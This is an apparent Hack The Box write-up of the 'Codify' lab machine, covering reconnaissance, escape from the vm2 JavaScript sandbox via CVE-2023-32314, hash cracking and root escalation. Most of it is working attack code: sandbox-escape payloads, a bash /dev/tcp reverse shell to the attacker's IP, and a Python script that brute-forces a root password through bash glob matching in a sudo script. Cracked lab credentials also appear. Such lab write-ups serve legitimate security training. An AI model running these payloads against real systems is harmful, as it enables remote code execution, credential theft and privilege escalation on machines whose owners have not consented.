# Codify
#activemachine 
#web 
#js
#sandbox
#hashcrack 
#easy 

### Reconnaissance
The first phase of the penetration test involved reconnaissance to gather information about the target system. Nmap was used to scan the target system and identify open ports and services. The results showed that the system had several open ports, including port 22 (SSH), port 80 (HTTP), and port 3000 (HTTP).

The following commands were used for reconnaissance `nmap -sV -v $TARGET`, here we have the original output:

```
Nmap scan report for 10.10.11.239
Host is up (0.054s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
3000/tcp open  http    Node.js Express framework
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Application Analysis
We start by performing a manual research on the website at first it doesn't show the content and it changes our URL to ` codify.htb`, so as usual we add this to our `/etc/hosts` by running the following command `echo "${TARGET} codify.htb" | sudo tee -a /etc/hosts`.

Now with access to the website, it seems to be a place where we can upload JavaScript code and it will be serve-rendered using nodejs, if we search a little bit more we can find that there are certain limitations in the code that we can render in order to stop us from using a basic command injection. In the last tab of the website we finally find information about the service that will be running our code inside a sandbox, this information includes the exact name and version of the product, so with this we can search if there are any known CVEs.
The exact product and version [vm2 3.9.16](https://github.com/patriksimek/vm2/releases/tag/3.9.16)
After just googling it we find that is associated to [CVE-2023-32314](https://www.cve.org/CVERecord?id=CVE-2023-32314)
We can also find a PoC of the exploit https://security.snyk.io/vuln/SNYK-JS-VM2-5537100

According to the CVE and the PoC we should be able to perform a Sandbox escape, to test this first we did a simple ping by running the following code in the website:
```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('ping -c 1 10.10.14.151');
}
`

console.log(vm.run(code));
```

To check if it worked, in local we run the following command to see if the ping is being executed as it should `sudo tcpdump -i tun0 icmp`.
```
17:15:26.875053 IP codify.htb > 10.10.14.151: ICMP echo request, id 3, seq 1, length 64

1 packet captured
```

Once we know we can break from the sandbox the most logical thing to do is to open a reverse shell to do this we will first open in local the listener by executing `nc -lvnp 4444`, after doing this we can run the following JavaScript code in the website to start the reverse shell

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync("bash -c 'sh -i >& /dev/tcp/10.10.14.151/4444 0>&1'");
}
`

console.log(vm.run(code));
```

### Lateral movement

Now we are inside the server as `svc`, first of all we get ourselfs a better terminal with `python3 -c 'import pty;pty.spawn("/bin/bash")'`, now we can start by exploring the `/var/www/` folder, inside it we can find a `/contact/` folder which contains a file called `tickets.db`

To explore the contents of this file we use `strings tickets.db`, the file contains a username and a hashed password among other things

Username=`joshua`
Hashed password=`$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`

We save the hashed password in a file and we can try to check if with a word-list password we can get the same hash, to do this  `john -w=/usr/share/wordlists/rockyou.txt hashes`.

It turns out that the password associated to that hash is `spongebob1`
Now we can access via ssh as `joshua`, the user flag will be in `~/user.txt`

### Privilege escalation
We start by checking if we are allowed to run any commands as sudo with `sudo -l`
```
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```
We have permission to run `/opt/scripts/mysql-backup.sh`, so we check its contents
```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

In the code we find a if that checks the password but it is using a syntax that allow us to abuse the pattern matching in order to perform a guided brute-force of the password, the exact part of code that we will  exploit is `[[ $DB_PASS == $USER_PASS ]]`. We create a python script to perform the brute-force and guess the password.
```python
#!/bin/python3
import subprocess

characters = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
]

numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

symbols = [
    '!', '"', '#', '$', '%', '&', "'", '(', ')', '+', ',', '-', '.', '/',
    ':', ';', '<', '=', '>', '?', '@', '[',  ']', '^', '_', '`', '{', '|', '}', '~'
]

all_characters = characters + numbers + symbols
password = ''
max_password_length = 32

for _ in range(max_password_length):
    for char in all_characters:
        trypass = password + char + '*'
        process = subprocess.Popen(["sudo", "/opt/scripts/mysql-backup.sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Pass the input data to the script
        output, errors = process.communicate(trypass.encode('utf-8'))
        if 'failed' not in output.decode('utf-8'):
            password = password+char
            print(password)
            break  # Password character found, move on to the next character
```

After just a few seconds we get the root user password which is `kljh12k3jhaskjh12kjh3`, now we can enter the root account, the flag is in `root/root.txt`